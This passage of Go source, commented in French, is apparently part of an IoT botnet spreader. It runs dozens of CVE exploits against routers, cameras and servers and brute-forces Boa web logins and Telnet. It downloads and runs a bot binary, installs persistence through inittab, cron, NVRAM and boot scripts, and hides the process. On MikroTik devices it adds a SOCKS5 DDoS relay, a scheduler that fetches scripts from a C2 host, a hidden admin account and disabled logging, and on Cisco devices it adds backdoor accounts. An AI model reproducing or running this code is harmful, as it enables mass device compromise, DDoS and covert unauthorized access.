	if exploitLinksysRCE(target, h, url)     { hit = true }
	if exploitNetgearDGN(target, h, url)     { hit = true }
	if exploitZyxelFW(target, h, url)        { hit = true }
	if exploitDlinkDNS320(target, h, url)    { hit = true }
	if exploitThinkPHP(target, h, url)       { hit = true }
	if exploitTendaRCE(target, h, url)       { hit = true }
	if exploitApacheTraversal(target, h, url){ hit = true }
	if exploitDasanGPON(target, h, url)      { hit = true }
	if exploitDlinkCamera(target, h, url)    { hit = true }
	if exploitCiscoRV(target, h, url)        { hit = true }
	if exploitCiscoIOSXE(target, h, url)    { hit = true }
	if exploitSophosXG(target, h, url)       { hit = true }
	if exploitConfluenceOGNL(target, h, url) { hit = true }
	if exploitYealinkRCE(target, h, url)     { hit = true }
	if exploitMikrotikWebfig(target, h, url) { hit = true }
	if exploitMikrotikWinbox(target, h, url) { hit = true }
	exploitRTSPCamera(target, h, url)
	if exploitBelkinRCE(target, h, url)      { hit = true }
	if exploitHNAP(target, h, url)           { hit = true }
	// CVEs 2023-2025
	if exploitAVTECH(target, h, url)           { hit = true }
	if exploitAVTECH2024(target, h, url)       { hit = true }
	if exploitEdimaxIC7100(target, h, url)     { hit = true }
	if exploitEdimaxIC2025(target, h, url)     { hit = true }
	if exploitTPLinkAX21(target, h, url)       { hit = true }
	if exploitDrayTek(target, h, url)          { hit = true }
	if exploitTPLinkVN020(target, h, url)      { hit = true }
	if exploitTPLinkArcher2024(target, h, url) { hit = true }
	if exploitPHPCGI2024(target, h, url)       { hit = true }
	if exploitASUSRouter(target, h, url)       { hit = true }
	if exploitFXCAE1021(target, h, url)        { hit = true }
	if exploitPaloAltoExpedition(target, h, url) { hit = true }
	if exploitIvantiCS(target, h, url)         { hit = true }
	exploitRegreSSHion(target, h, url)
	// CVEs 2025-2026
	if exploitDlinkDNScfg(target, h, url)      { hit = true }
	if exploitVivotekUpload(target, h, url)    { hit = true }
	if exploitMilesightCamera(target, h, url)  { hit = true }
	if exploitNetisAC1200(target, h, url)      { hit = true }
	if exploitLinksysMesh(target, h, url)      { hit = true }
	if exploitSpring4Shell(target, h, url)     { hit = true }
	if exploitGeoServer(target, h, url)        { hit = true }

	// ── CVEs serveurs/infra ──
	if exploitOracleWebLogic(target, h, url) { hit = true }
	if exploitShellshock(target, h, url)     { hit = true }
	if exploitGhostcat(target, h, url)       { hit = true }
	if exploitJiraEL(target, h, url)         { hit = true }
	if exploitNextcloud(target, h, url)      { hit = true }

	// Second passage avec build legacy (kernel < 3.17) si disponible
	if lu := bestLegacyURL(); lu != "" && lu != url {
		h2 := randHide()
		exploitHikvisionRCE(target, h2, lu)
		exploitDVRAuth(target, h2, lu)
		exploitZyxelP660(target, h2, lu)
		exploitMVPowerDVR(target, h2, lu)
		exploitGPON(target, h2, lu)
		exploitRealtekSDK(target, h2, lu)
		exploitRealtekUDP(target, h2, lu)
		exploitLinksysRCE(target, h2, lu)
		exploitDasanGPON(target, h2, lu)
		exploitDlinkCamera(target, h2, lu)
		exploitAVTECH(target, h2, lu)
		exploitAVTECH2024(target, h2, lu)
		exploitEdimaxIC7100(target, h2, lu)
		exploitEdimaxIC2025(target, h2, lu)
		exploitTPLinkAX21(target, h2, lu)
		exploitDrayTek(target, h2, lu)
		exploitTPLinkVN020(target, h2, lu)
		exploitASUSRouter(target, h2, lu)
		exploitFXCAE1021(target, h2, lu)
		exploitDlinkDNScfg(target, h2, lu)
		exploitVivotekUpload(target, h2, lu)
		exploitMilesightCamera(target, h2, lu)
		exploitNetisAC1200(target, h2, lu)
		exploitLinksysMesh(target, h2, lu)
		exploitSpring4Shell(target, h2, lu)
		exploitGeoServer(target, h2, lu)
		// CVEs Éducationnelles
		exploitF5BigIP(target, h2, lu)
		exploitOracleWebLogic(target, h2, lu)
		exploitFortiGateRCE(target, h2, lu)
		exploitShellshock(target, h2, lu)
		exploitGhostcat(target, h2, lu)
		exploitJiraEL(target, h2, lu)
		exploitNextcloud(target, h2, lu)
	}

	return hit
}

// ── Phase 2 : CVE post-auth (bénéficient d'un login préalable) ────────────────
func sendPostAuthExploits(target string) bool {
	url := bestURL()
	if url == "" { return false }
	if p := portOf(target); p == "22" || p == "23" { return false }
	h := randHide()
	hit := false
	if exploitDlinkRCE(target, h, url)   { hit = true }
	if exploitNetgearRCE(target, h, url) { hit = true }
	if exploitIPCameraRCE(target, h, url){ hit = true }
	if exploitTPLinkRCE(target, h, url)  { hit = true }
	if exploitHuaweiRCE(target, h, url)  { hit = true }
	if exploitZTERCE(target, h, url)      { hit = true }
	if exploitZyxelP660HN(target, h, url) { hit = true }
	// Éducationnelles post-auth
	if exploitNagiosXI(target, h, url)   { hit = true }
	return hit
}

func sendExploit(target string) int {
	sendPreAuthExploits(target)
	return 1
}

func sendLogin(target string) int {
	// Login HTTP Boa — inutile sur Telnet/SSH
	if p := portOf(target); p == "23" || p == "22" { return 0 }

	var isLoggedIn int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, 30 * time.Second) // Réduit à 30 secondes
	    if err != nil {
			return -1
	    }

		cntLen = 14
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

	    conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes
	    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
		    return -1
		}

		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Moved Temporarily") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		// Sauvegarde les credentials réussis
		lastSuccessfulCredsMu.Lock()
		lastSuccessfulCreds[target] = loginsString[x]
		lastSuccessfulCredsMu.Unlock()

		// statusLogins est maintenant incrémenté dans processTarget
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return 1
	} else {
		return -1
	}
}

func checkDevice(target string, timeout time.Duration) int {
	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
	if err != nil {
		return -1
	}
	defer conn.Close()

	// Tenter de lire la bannière HTTP pour identifier l'appareil
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", target)

	bytebuf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
	n, err := conn.Read(bytebuf)
	if err != nil || n <= 0 {
		return 1 // On tente quand même si on ne peut pas lire
	}

	banner := string(bytebuf[:n])
	if strings.Contains(banner, "Boa/0.93.15") || strings.Contains(banner, "GPON") {
		return 1 // GPON / Boa
	} else if strings.Contains(banner, "D-Link") || strings.Contains(banner, "DIR-") {
		return 2 // D-Link
	} else if strings.Contains(banner, "Netgear") || strings.Contains(banner, "WNR") {
		return 3 // Netgear
	} else if strings.Contains(banner, "Huawei") || strings.Contains(banner, "HG532") {
		return 4 // Huawei
	} else if strings.Contains(banner, "TP-LINK") {
		return 5 // TP-Link
	}

	return 1 // Par défaut
}

// verifyInfection vérifie si le device a téléchargé le bot (CVE Work réel).
// En mode local : on check la map downloadedIPs (serveur HTTP).
// En mode auto  : on ne peut pas tracker les downloads (hébergeur externe).
func verifyInfection(targetIP string, timeout time.Duration) bool {
    if c2ServerIP == "" {
        // Mode auto — on ne peut pas tracker, CVE Work reste à 0
        return false
    }
    // Attendre que le device ait le temps de télécharger
    deadline := time.Now().Add(timeout)
    for time.Now().Before(deadline) {
        if wasDownloaded(targetIP) {
            return true
        }
        time.Sleep(500 * time.Millisecond)
    }
    return false
}
 
 func reportToC2(_ string) {}

// ─── Telnet Spreader ──────────────────────────────────────────────────────────

// readTelnetUntil lit jusqu'à trouver un des patterns, en gérant la négociation IAC.
func readTelnetUntil(conn net.Conn, timeout time.Duration, patterns ...string) (string, bool) {
	conn.SetDeadline(time.Now().Add(timeout))
	var buf []byte
	tmp := make([]byte, 1)
	iac := make([]byte, 2)
	for {
		if _, err := conn.Read(tmp); err != nil {
			return string(buf), false
		}
		b := tmp[0]
		if b == 0xFF {
			if _, err := conn.Read(iac); err != nil {
				return string(buf), false
			}
			if iac[0] == 0xFB {
				conn.Write([]byte{0xFF, 0xFE, iac[1]}) // WILL → DONT
			} else if iac[0] == 0xFD {
				conn.Write([]byte{0xFF, 0xFC, iac[1]}) // DO   → WONT
			}
			continue
		}
		buf = append(buf, b)
		low := strings.ToLower(string(buf))
		for _, p := range patterns {
			if strings.Contains(low, strings.ToLower(p)) {
				return string(buf), true
			}
		}
		if len(buf) > 4096 {
			buf = buf[len(buf)-512:]
		}
	}
}

// kernelIsLegacy retourne true si le kernel est < 3.17 (pas de getrandom syscall).
func kernelIsLegacy(ver string) bool {
	// ver ressemble à "3.2.0-4-amd64" ou "5.15.0-1-amd64"
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	major, err1 := strconv.Atoi(parts[0])
	minor, err2 := strconv.Atoi(strings.SplitN(parts[1], "-", 2)[0])
	if err1 != nil || err2 != nil {
		return false
	}
	return major < 3 || (major == 3 && minor < 17)
}

// telnetPickURL retourne l'URL principale du bot pour l'arch détectée.
func telnetPickURL(archOut string, legacy bool) string {
	urls := telnetPickURLList(archOut, legacy)
	if len(urls) > 0 { return urls[0] }
	return ""
}

// telnetPickURLList retourne TOUTES les URLs à tester pour une arch (primaire + backup + legacy).
// Ordre : primaire correct → backup correct → legacy correct → legacy backup → bestURL fallback.
func telnetPickURLList(archOut string, legacy bool) []string {
	a := strings.ToLower(archOut)
	var urls []string
	addURL := func(u string) {
		if u != "" {
			for _, existing := range urls {
				if existing == u { return }
			}
			urls = append(urls, u)
		}
	}

	type archEntry struct{ legURL, legBackup, normalArch string }
	var entry archEntry
	switch {
	case strings.Contains(a, "aarch64") || strings.Contains(a, "arm64"):
		entry = archEntry{_urlArm64Legacy, _urlArm64LegacyB, "arm64"}
	case strings.Contains(a, "armv5") || strings.Contains(a, "armv4"):
		entry = archEntry{_urlArmv5Legacy, _urlArmv5LegacyB, "armv5"}
	case strings.Contains(a, "arm"):
		entry = archEntry{_urlArmLegacy, _urlArmLegacyB, "arm"}
	case strings.Contains(a, "mipsel") || strings.Contains(a, "mips little"):
		entry = archEntry{_urlMipsleLegacy, _urlMipsleLegacyB, "mipsle"}
	case strings.Contains(a, "mips"):
		entry = archEntry{_urlMipsLegacy, _urlMipsLegacyB, "mips"}
	case strings.Contains(a, "x86_64") || strings.Contains(a, "amd64"):
		entry = archEntry{_urlAmd64Legacy, _urlAmd64LegacyB, "x86_64"}
	case strings.Contains(a, "i686") || strings.Contains(a, "i386"):
		entry = archEntry{_urlX86Legacy, _urlX86LegacyB, "x86"}
	case strings.Contains(a, "ppc"):
		entry = archEntry{_urlPpcLegacy, _urlPpcLegacyB, "ppc"}
	}

	if legacy {
		addURL(entry.legURL)
		addURL(entry.legBackup)
		addURL(botURL(entry.normalArch))
		addURL(botURLBackup(entry.normalArch))
	} else {
		addURL(botURL(entry.normalArch))
		addURL(botURLBackup(entry.normalArch))
		addURL(entry.legURL)
		addURL(entry.legBackup)
	}
	// Fallback global si rien trouvé
	if len(urls) == 0 {
		addURL(bestURL())
		addURL(bestLegacyURL())
	}
	return urls
}

// persistenceBlast retourne les commandes de persistance IoT avancees pour un
// shell interactif (Telnet) — complète ce que dlCmd envoie déjà en inline.
// Chaque commande est envoyee separement (plusieurs échanges Telnet).
func persistenceBlast(url string) []string {
	src := "/tmp/.b"
	dl := fmt.Sprintf(
		"(wget -q --no-check-certificate -O %s %s 2>/dev/null||curl -fskL -o %s %s 2>/dev/null||busybox wget -q -O %s %s 2>/dev/null)&&chmod +x %s 2>/dev/null",
		src, url, src, url, src, url, src,
	)
	relaunch := fmt.Sprintf("pgrep -x .b>/dev/null 2>&1||{%s;%s &}", dl, src)
	cron := fmt.Sprintf("* * * * * %s", relaunch)

	cmds := []string{}

	// ── 1. Copies flash IoT (ordre priorité : flash persistant > RAM exec) ────
	for _, d := range []string{
		"/jffs/usr/bin", "/jffs/bin", "/jffs",         // ASUS Merlin / DD-WRT
		"/overlay/usr/bin", "/overlay/bin", "/overlay", // OpenWrt overlay
		"/mnt/mtd/app", "/var/Sofia", "/mnt/mtd",       // DVR HiSilicon (Dahua/TVT)
		"/data", "/data/local",                         // Netgear / D-Link
		"/usr/bin", "/bin", "/sbin",                    // chemins standard
		"/dev/shm", "/var/tmp",                         // RAM — bypass noexec
	} {
		cmds = append(cmds, fmt.Sprintf("cp %s %s/.b 2>/dev/null&&chmod +x %s/.b 2>/dev/null", src, d, d))
	}

	// ── 2. inittab ::respawn (BusyBox — relance immediat si tue) ─────────────
	cmds = append(cmds,
		fmt.Sprintf("grep -qF '.b' /etc/inittab 2>/dev/null||echo '::respawn:%s'>>/etc/inittab 2>/dev/null", src),
		"kill -HUP 1 2>/dev/null||true",
	)

	// ── 3. Scripts de boot ────────────────────────────────────────────────────
	cmds = append(cmds,
		fmt.Sprintf("grep -qF '.b' /etc/rc.local 2>/dev/null||sed -i 's|^exit 0|%s \\&\\nexit 0|' /etc/rc.local 2>/dev/null||echo '%s &'>>/etc/rc.local 2>/dev/null", src, src),
		fmt.Sprintf("grep -qF '.b' /etc/init.d/rcS 2>/dev/null||echo '%s &'>>/etc/init.d/rcS 2>/dev/null", src),
		fmt.Sprintf("grep -qF '.b' /etc/rcS 2>/dev/null||echo '%s &'>>/etc/rcS 2>/dev/null", src),
		fmt.Sprintf("grep -qF '.b' /etc/preinit 2>/dev/null||echo '%s &'>>/etc/preinit 2>/dev/null", src),
	)

	// ── 4. procd OpenWrt (format strict avec respawn) ─────────────────────────
	cmds = append(cmds,
		fmt.Sprintf("printf '#!/bin/sh /etc/rc.common\\nSTART=99\\nUSE_PROCD=1\\nstart_service(){procd_open_instance;procd_set_param command %s;procd_set_param respawn 3600 5 0;procd_close_instance;}\\n'>/etc/init.d/.b 2>/dev/null&&chmod +x /etc/init.d/.b&&/etc/init.d/.b enable 2>/dev/null&&/etc/init.d/.b start 2>/dev/null", src),
		// Copie dans overlay pour survie au sysupgrade
		"mkdir -p /overlay/etc/init.d 2>/dev/null&&cp /etc/init.d/.b /overlay/etc/init.d/.b 2>/dev/null&&chmod +x /overlay/etc/init.d/.b 2>/dev/null",
	)

	// ── 5. BusyBox crond ─────────────────────────────────────────────────────
	cmds = append(cmds,
		fmt.Sprintf("echo '%s'>>/etc/crontabs/root 2>/dev/null", cron),
		fmt.Sprintf("echo '%s'>>/var/spool/cron/crontabs/root 2>/dev/null", cron),
		"pgrep crond>/dev/null 2>&1||/usr/sbin/crond -b -l 8 2>/dev/null||crond 2>/dev/null",
	)

	// ── 6. NVRAM Broadcom (ASUS/Netgear/Linksys/D-Link) ──────────────────────
	cmds = append(cmds,
		fmt.Sprintf("nvram set rc_startup=\"$(nvram get rc_startup 2>/dev/null);%s &\" 2>/dev/null&&nvram commit 2>/dev/null", src),
		fmt.Sprintf("nvram set rc_firewall=\"$(nvram get rc_firewall 2>/dev/null);%s &\" 2>/dev/null&&nvram commit 2>/dev/null", src),
	)

	// ── 7. UCI OpenWrt ───────────────────────────────────────────────────────
	cmds = append(cmds,
		fmt.Sprintf("grep -qF '.b' /etc/config/system 2>/dev/null||printf '\\nconfig cmd \\'b\\'\\n\\toption command \\'%s \\'\\n'>>/etc/config/system 2>/dev/null&&uci commit system 2>/dev/null", src+" &"),
	)

	// ── 8. Watchdog 30s ───────────────────────────────────────────────────────
	cmds = append(cmds,
		fmt.Sprintf("(while true;do %s;sleep 30;done)&", relaunch),
	)

	// ── 9. Masquage process ───────────────────────────────────────────────────
	cmds = append(cmds,
		"mount --bind /bin/busybox /proc/$(pgrep -nx .b 2>/dev/null)/exe 2>/dev/null||true",
	)

	return cmds
}

// deviceInfo regroupe le type d'appareil et la méthode d'attaque disponible.
type deviceInfo struct {
	kind    string // "routeros", "cisco", "busybox", "linux", "dvr", "camera", "xdsl", "unknown"
	vendor  string // "mikrotik", "cisco", "dahua", "hikvision", "zte", "huawei", "dlink", "tplink", etc.
	arch    string // "mips", "mipsel", "arm", "arm64", "x86" si détectable depuis le banner
	canELF  bool   // peut exécuter un ELF Linux (BusyBox/Linux standard)
	canROS  bool   // shell RouterOS
	canIOS  bool   // shell Cisco IOS
	method  string // résumé de l'attaque applicable
}

// detectDevice fingerprinte un device depuis son banner Telnet initial.
func detectDevice(banner string) deviceInfo {
	b := strings.ToLower(banner)
	di := deviceInfo{kind: "unknown", canELF: false}

	switch {
	// ── RouterOS / MikroTik ──────────────────────────────────────────────
	case strings.Contains(b, "mikrotik") || strings.Contains(b, "routeros"):
		di.kind = "routeros"; di.vendor = "mikrotik"
		di.canROS = true; di.canELF = false
		di.method = "Telnet-ROS(SOCKS5+scheduler) + Chimay-Red(CVE-2018-14847)"

	// ── Cisco IOS / IOS XE ───────────────────────────────────────────────
	case strings.Contains(b, "cisco") || strings.Contains(b, "ios xe") || strings.Contains(b, "user access verification"):
		di.kind = "cisco"; di.vendor = "cisco"
		di.canIOS = true; di.canELF = false
		di.method = "Telnet-IOS(backdoor user) + CVE-2023-20198 + CVE-2019-1653"

	// ── DVR / NVR (Dahua, XiongMai, HiSilicon) ───────────────────────────
	case strings.Contains(b, "dvr") || strings.Contains(b, "nvr") || strings.Contains(b, "xmeye") ||
		strings.Contains(b, "hisilicon") || strings.Contains(b, "hi3516") || strings.Contains(b, "hi3518"):
		di.kind = "dvr"; di.vendor = "dahua/xiongmai"
		di.canELF = true; di.arch = "arm"
		di.method = "Telnet-Linux(ARM) + CVE-2021-33044(Dahua) + dropper"

	// ── Caméras IP (Hikvision, AXIS, Foscam) ─────────────────────────────
	case strings.Contains(b, "hikvision") || strings.Contains(b, "axis") || strings.Contains(b, "foscam") ||
		strings.Contains(b, "ipcam") || strings.Contains(b, "netwave"):
		di.kind = "camera"; di.vendor = "hikvision/axis"
		di.canELF = true; di.arch = "arm"
		di.method = "Telnet-Linux(ARM) + CVE-2021-36260(Hikvision) + dropper"

	// ── Broadcom xDSL / BCM ───────────────────────────────────────────────
	case strings.Contains(b, "bcm") || strings.Contains(b, "xdsl") || strings.Contains(b, "adsl") ||
		strings.Contains(b, "broadcom"):
		di.kind = "xdsl"; di.vendor = "broadcom"
		di.canELF = true; di.arch = "mips"
		di.method = "Telnet-Linux(MIPS) + nvram persist + dropper"

	// ── Ralink / MediaTek ─────────────────────────────────────────────────
	case strings.Contains(b, "ralink") || strings.Contains(b, "mt7") || strings.Contains(b, "mediatek"):
		di.kind = "linux"; di.vendor = "ralink/mediatek"
		di.canELF = true; di.arch = "mipsel"
		di.method = "Telnet-Linux(MIPSel) + dropper"

	// ── OpenWrt / DD-WRT / Tomato ─────────────────────────────────────────
	case strings.Contains(b, "openwrt") || strings.Contains(b, "dd-wrt") || strings.Contains(b, "tomato") ||
		strings.Contains(b, "lede"):
		di.kind = "linux"; di.vendor = "openwrt/ddwrt"
		di.canELF = true; di.arch = "mips"
		di.method = "Telnet-Linux(OpenWrt) + opkg/ash + dropper"

	// ── ZTE ───────────────────────────────────────────────────────────────
	case strings.Contains(b, "zte") || strings.Contains(b, "zxdsl") || strings.Contains(b, "zxhn"):
		di.kind = "linux"; di.vendor = "zte"
		di.canELF = true; di.arch = "mips"
		di.method = "Telnet-Linux(MIPS) + CVE-ZTE + dropper"

	// ── Huawei ────────────────────────────────────────────────────────────
	case strings.Contains(b, "huawei") || strings.Contains(b, "hg8") || strings.Contains(b, "echolife"):
		di.kind = "linux"; di.vendor = "huawei"
		di.canELF = true; di.arch = "arm"
		di.method = "Telnet-Linux(ARM) + CVE-Huawei + dropper"

	// ── TP-Link ───────────────────────────────────────────────────────────
	case strings.Contains(b, "tp-link") || strings.Contains(b, "tplink") || strings.Contains(b, "tl-"):
		di.kind = "linux"; di.vendor = "tplink"
		di.canELF = true; di.arch = "mips"
		di.method = "Telnet-Linux(MIPS) + dropper"

	// ── D-Link ────────────────────────────────────────────────────────────
	case strings.Contains(b, "d-link") || strings.Contains(b, "dlink") || strings.Contains(b, "dap-") ||
		strings.Contains(b, "dir-"):
		di.kind = "linux"; di.vendor = "dlink"
		di.canELF = true; di.arch = "mips"
		di.method = "Telnet-Linux(MIPS) + CVE-DLink + dropper"

	// ── BusyBox générique ─────────────────────────────────────────────────
	case strings.Contains(b, "busybox"):
		di.kind = "busybox"; di.vendor = "generic"
		di.canELF = true
		di.method = "Telnet-BusyBox + dropper (arch via uname)"

	// ── Linux générique ───────────────────────────────────────────────────
	case strings.Contains(b, "linux") || strings.Contains(b, "ubuntu") || strings.Contains(b, "debian") ||
		strings.Contains(b, "centos") || strings.Contains(b, "fedora"):
		di.kind = "linux"; di.vendor = "generic-linux"
		di.canELF = true
		di.method = "Telnet-Linux + dropper (arch via uname)"

	default:
		di.kind = "unknown"; di.canELF = true // on tente quand même
		di.method = "Telnet-inconnu, tentative dropper générique"
	}
	return di
}

// telnetRouterOSInfect infecte un MikroTik RouterOS via son CLI Telnet.
// Méthode Meris : SOCKS5 proxy + scheduler C2 + compte caché.
func telnetRouterOSInfect(conn net.Conn, ip, user, pass string) bool {
	send := func(cmd string) {
		conn.Write([]byte(cmd + "\r\n"))
		time.Sleep(400 * time.Millisecond)
	}
	readPrompt := func() string {
		out, _ := readTelnetUntil(conn, 6*time.Second, "] > ", "] >")
		return out
	}

	fmt.Printf("[ROS] %s infection RouterOS...\n", ip)

	// 1. Activer proxy SOCKS5 (utilisé comme relais DDoS — méthode Meris)
	send("/ip socks set enabled=yes port=4145 max-connections=200 connection-idle-timeout=2m")
	readPrompt()
	send("/ip socks access add action=allow comment=\"\"")
	readPrompt()

	// 2. Ouvrir le firewall pour le proxy et notre C2
	send("/ip firewall filter disable [find where chain=input action=drop]")
	readPrompt()
	send("/ip firewall filter add chain=input protocol=tcp dst-port=4145 action=accept comment=\"\"")
	readPrompt()

	// 3. Scheduler de persistance — re-télécharge et exécute script ROS depuis C2
	c2Base := "http://robbhabbo.online"
	if _dlShURL != "" {
		// Extraire le host depuis l'URL dl.sh
		u := strings.TrimPrefix(_dlShURL, "http://")
		u = strings.TrimPrefix(u, "https://")
		if idx := strings.Index(u, "/"); idx != -1 {
			c2Base = "http://" + u[:idx]
		}
	}
	rosScript := fmt.Sprintf(
		"/tool fetch url=\"%s/ros.rsc\" dst-path=\".sys.rsc\" 2>/dev/null; /import .sys.rsc",
		c2Base,
	)
	send(fmt.Sprintf("/system scheduler remove [find where name=\".sys\"] 2>/dev/null"))
	readPrompt()
	send(fmt.Sprintf("/system scheduler add name=\".sys\" interval=00:30:00 on-event=\"%s\" disabled=no comment=\"\"", rosScript))
	readPrompt()

	// 4. Ajouter compte admin caché (backup access)
	send("/user remove [find where name=\"service\" group!=\"full\"] 2>/dev/null")
	readPrompt()
	send("/user add name=\"service\" password=\"service\" group=full comment=\"\"")
	readPrompt()

	// 5. Désactiver les logs pour masquer nos actions
	send("/system logging set 0 disabled=yes 2>/dev/null")
	readPrompt()

	// 6. DNS redirect — optionnel, pour MITM
	send(fmt.Sprintf("/ip dns set servers=\"%s\" allow-remote-requests=yes", "8.8.8.8"))
	readPrompt()

	fmt.Printf("[ROS] %s INFECTÉ ✓ (SOCKS5:4145 actif)\n", ip)
	return true
}

// telnetCiscoInfect infecte un Cisco IOS via Telnet — backdoor TCL + enable password dump.
func telnetCiscoInfect(conn net.Conn, ip string) bool {
	send := func(cmd string) {
		conn.Write([]byte(cmd + "\r\n"))
		time.Sleep(300 * time.Millisecond)
	}
	readAny := func() string {
		out, _ := readTelnetUntil(conn, 5*time.Second, "#", ">", "--More--")
		return out
	}

	fmt.Printf("[CISCO] %s infection IOS...\n", ip)

	// Passer en mode enable si possible
	send("enable")
	time.Sleep(500 * time.Millisecond)
	for _, ep := range []string{"", "admin", "cisco", "enable", "password", "1234", "secret"} {
		conn.Write([]byte(ep + "\r\n"))
		out := readAny()
		if strings.Contains(out, "#") {
			break
		}
	}

	// Entrer en mode config terminal
	send("terminal length 0")
	readAny()
	send("conf t")
	readAny()

	// Backdoor : compte local caché
	send("username service privilege 15 secret service")
	readAny()
	send("username admin privilege 15 secret admin123")
	readAny()

	// Activer Telnet + SSH sur toutes les VTY
	send("line vty 0 15")
	readAny()
	send("login local")
	readAny()
	send("transport input all")
	readAny()
	send("exit")
	readAny()

	// HTTP server pour accès web (optionnel)
	send("ip http server")
	readAny()
	send("ip http authentication local")
	readAny()

	// Désactiver logging console pour masquer
	send("no logging console")
	readAny()
	send("end")
	readAny()
	send("write memory")
	readAny()

	fmt.Printf("[CISCO] %s INFECTÉ ✓ (backdoor user:service)\n", ip)
	return true
}

func telnetExploit(ip, user, pass string) bool {
	// Essaie port 23 puis 2323 (DVR/cam chinois, bots Mirai exposent souvent 2323)
	var conn net.Conn
	var err error
	port := "23"
	conn, err = net.DialTimeout("tcp", ip+":23", 3*time.Second)
	if err != nil {
		conn, err = net.DialTimeout("tcp", ip+":2323", 3*time.Second)
		if err != nil {
			return false
		}
		port = "2323"
	}
	_ = port
	defer conn.Close()

	// Lire le banner initial (avant login) pour fingerprinter le device
	banner, _ := readTelnetUntil(conn, 15*time.Second, "login:", "username:", "user:", "ogin")
	if banner == "" {
		fmt.Printf("[Telnet] %s NO-LOGIN-PROMPT\n", ip)
		return false
	}
	di := detectDevice(banner)
	fmt.Printf("[Telnet] %s %-10s %-12s → %s\n", ip, di.kind, di.vendor, di.method)

	conn.Write([]byte(user + "\n"))

	// Certains devices donnent le shell directement sans demander de password
	passOut, gotPass := readTelnetUntil(conn, 10*time.Second, "password:", "passwd:", "assword", "# ", "$ ", ">\n", "#\n")
	var shell string
	var ok bool
	if gotPass && (strings.Contains(strings.ToLower(passOut), "password") || strings.Contains(strings.ToLower(passOut), "passwd")) {
		conn.Write([]byte(pass + "\n"))
		shell, ok = readTelnetUntil(conn, 10*time.Second, "# ", "$ ", "> ", "#\n", "$\n", ">\n")
	} else if gotPass {
		// Pas de prompt password — déjà dans le shell
		shell = passOut
		ok = true
	}
	if !ok {
		fmt.Printf("[Telnet] %s NO-SHELL (creds=%s:%s)\n", ip, user, pass)
		return false
	}
	// Détecter shells restreints sur le PROMPT uniquement (pas la bannière entière)
	// RouterOS → "[Admin@MikroTik] >" ou "> " seul ; Cisco → "Router>" etc.
	// On ne check que la dernière ligne non-vide pour ignorer le banner de login.
	shellPrompt := shell
	for _, l := range strings.Split(strings.ReplaceAll(shell, "\r", ""), "\n") {
		if t := strings.TrimSpace(l); t != "" {
			shellPrompt = t
		}
	}
	// Détecter le type de shell pour choisir la méthode d'infection
	isRouterOS := strings.HasSuffix(shellPrompt, "] >") || strings.HasSuffix(shellPrompt, "]>") ||
		strings.Contains(shellPrompt, "RouterOS")
	isCisco := strings.Contains(shellPrompt, "User Access Verification") ||
		(strings.HasSuffix(shellPrompt, ">") && !strings.Contains(shellPrompt, "$") &&
			!strings.Contains(shellPrompt, "#") && !strings.Contains(shellPrompt, "["))
	isLinux := strings.Contains(shellPrompt, "$") || strings.Contains(shellPrompt, "#")

	if isRouterOS {
		if telnetRouterOSInfect(conn, ip, user, pass) {
			go logInfection(ip, "routeros", "TELNET-ROS", user+":"+pass)
			return true
		}
		return false
	}
	if isCisco && !isLinux {
		if telnetCiscoInfect(conn, ip) {
			go logInfection(ip, "cisco", "TELNET-CISCO", user+":"+pass)
			return true
		}
		return false
	}
	if !isLinux {
		fmt.Printf("[Telnet] %s UNKNOWN-SHELL: %q\n", ip, shellPrompt)
		return false
	}

	// Détecter l'architecture et la version du kernel
	conn.Write([]byte("uname -m\n"))
	archRaw, _ := readTelnetUntil(conn, 5*time.Second, "# ", "$ ", "> ")
	// Nettoyer : strip ANSI, garder la première ligne qui ressemble à une arch
	stripANSI := func(s string) string {
		out := strings.Builder{}
		skip := false
		for _, c := range s {
			if c == '\x1b' { skip = true; continue }
			if skip { if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') { skip = false }; continue }
			out.WriteRune(c)
		}
		return out.String()
	}
	isValidArch := func(s string) bool {
		if len(s) < 2 || len(s) > 20 { return false }
		if strings.ContainsAny(s, "@[]$#\x1b(){}|&;`'\"") { return false }
		if strings.Contains(s, "uname") || strings.Contains(s, "command") { return false }
		return true
	}
	archOut := ""
	for _, l := range strings.Split(strings.ReplaceAll(archRaw, "\r", ""), "\n") {
		l = strings.TrimSpace(stripANSI(l))
		if isValidArch(l) {
			archOut = l
			break
		}
	}
	// Fallback BusyBox : busybox uname -m, puis /proc/cpuinfo
	if archOut == "" {
		conn.Write([]byte("busybox uname -m\n"))
		r2, _ := readTelnetUntil(conn, 4*time.Second, "# ", "$ ", "> ")
		for _, l := range strings.Split(strings.ReplaceAll(r2, "\r", ""), "\n") {
			l = strings.TrimSpace(stripANSI(l))
			if isValidArch(l) { archOut = l; break }
		}
	}
	if archOut == "" {
